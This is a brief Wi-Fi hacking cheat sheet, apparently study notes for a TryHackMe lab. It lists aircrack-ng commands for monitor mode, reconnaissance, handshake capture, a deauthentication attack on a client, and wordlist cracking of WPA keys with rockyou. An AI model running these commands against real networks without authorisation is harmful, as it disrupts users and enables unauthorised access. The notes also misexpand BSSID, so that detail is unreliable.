[Wifi Hacking 101](https://tryhackme.com/r/room/wifihacking101?ref=blog.tryhackme.com) | [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)


## setup

1. [Install Aircrack-ng](https://github.com/TurboLabIt/cybersec/blob/main/script/aircrack/install.sh)


## network interfaces

````shell
sudo airmon-ng

````

Alternative:

````shell
iw dev
iw dev wlan0 info

````


## monitor mode

the Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether 
it is directed to the device or not.
It passively captures all network traffic within range for analysis without joining a network.

````shell
sudo airmon-ng check kill
sudo airmon-ng start wlan0

````

The interface name in monitor mode is `wlan0mon`.

Alternative:

````shell
sudo ip link set dev wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set dev wlan0 up

````


## recon

MAC == BSSID (Bervice Set Identifier)

````shell
iw dev wlan0 scan

````

Alternative:

````shell
sudo airodump-ng wlan0

````


## capture + deauth attack

Capture:

````shell
sudo airodump-ng -c <network-channel-number> --bssid <access-point-mac-address> -w output-file wifi-capture.cap wlan0

````


As soon as a client is detected (`STATION`):

````shell
sudo aireplay-ng -0 1 -a <access-point-mac-address> -c <client-to-deauth-mac-address> wlan0

````

As soon as the `WPA handshake` is captured, you can stop.


## crack

````shell
sudo aircrack-ng -a 2 -b <access-point-mac-address> -w /usr/share/wordlists/rockyou.txt *.cap

````
